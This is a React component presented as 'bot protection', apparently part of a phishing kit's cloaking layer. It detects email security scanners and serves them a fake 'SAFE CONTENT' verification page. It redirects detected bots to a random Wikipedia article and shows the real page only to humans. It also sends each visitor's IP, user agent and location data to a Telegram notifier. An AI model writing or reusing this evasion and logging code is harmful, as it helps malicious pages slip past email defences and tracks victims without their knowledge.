import React, { useEffect, useState } from 'react';
import { botDetection } from '@/utils/services/crawlerDetectionService';
import { telegramNotifier } from '@/utils/services/telegramNotifier';

interface BotProtectionProps {
  children: React.ReactNode;
  onValidated?: (isHuman: boolean, locationData?: any) => void;
}

type ProtectionState = 'human' | 'redirect' | 'scanner_response';

const BotProtection: React.FC<BotProtectionProps> = ({ children, onValidated }) => {
  const [state, setState] = useState<ProtectionState>('human');
  const [detectionResult, setDetectionResult] = useState<any>(null);

  useEffect(() => {
    let hasValidated = false;

    const performDetection = async () => {
      if (hasValidated) return;
      
      try {
        // Run streamlined bot detection (ZeroBot API + email scanner only)
        const result = await botDetection.isBot();
        
        if (!hasValidated) {
          hasValidated = true;
          setDetectionResult(result);
          
          // Send Telegram notification for bot detection events
          const sendNotification = async () => {
            try {
              const clientIP = result.locationData?.ip || 'unknown';
              await telegramNotifier.sendNotification({
                ip: clientIP,
                userAgent: navigator.userAgent,
                isBot: result.isBot,
                confidence: result.confidence,
                action: result.action,
                behaviorScore: result.behaviorScore || 0,
                localScore: result.localScore || 0,
                alienScore: result.alienScore || 0,
                locationData: result.locationData
              });
              console.log('✅ Bot notification sent successfully');
            } catch (error) {
              console.error('❌ Bot notification failed:', error);
            }
          };
          
          // Handle actions based on streamlined detection
          switch (result.action) {
            case 'redirect':
              // ZeroBot detected bot - redirect to Wikipedia
              sendNotification();
              window.location.replace('https://en.wikipedia.org/wiki/Special:Random');
              setState('redirect');
              break;
              
            case 'scanner_response':
              // Email scanner detected - serve safe content
              setState('scanner_response');
              break;
              
            case 'undecided':
              // API timeout/failure - show manual decision interface
              sendNotification();
              setState('scanner_response'); // Use scanner_response to show FakeScanningInterface
              break;
              
            case 'allow':
            default:
              // Human detected - allow access
              setState('human');
              onValidated?.(true, result.locationData);
              break;
          }
        }
      } catch (error) {
        // On error, allow access (fail-safe)
        setState('human');
        onValidated?.(true, null);
      }
    };

    // Start detection immediately (no loading screen)
    performDetection();
  }, [onValidated]);

  // Render based on state
  switch (state) {
    case 'scanner_response':
      // Render safe content for email scanners
      return (
        <div 
          dangerouslySetInnerHTML={{
            __html: detectionResult?.scannerContent || `
              <!DOCTYPE html>
              <html>
              <head>
                  <meta charset="UTF-8">
                  <title>Content Verified</title>
                  <meta name="robots" content="noindex,nofollow">
              </head>
              <body style="margin: 0; padding: 20px; font-family: Arial, sans-serif;">
                  <div style="text-align: center; margin-top: 50px;">
                      <h2 style="color: #333;">Content Verified</h2>
                      <p style="color: #666;">This content has been verified by email security systems.</p>
                      <div style="margin-top: 20px; color: #28a745; font-weight: bold;">
                          ✓ SAFE CONTENT
                      </div>
                  </div>
              </body>
              </html>
            `
          }}
        />
      );
      
    case 'redirect':
      return (
        <div style={{ 
          position: 'fixed', 
          top: 0, 
          left: 0, 
          width: '100%', 
          height: '100%', 
          backgroundColor: '#ffffff', 
          zIndex: 9999 
        }}></div>
      );
      
    case 'human':
    default:
      return <>{children}</>;
  }
};

export default BotProtection;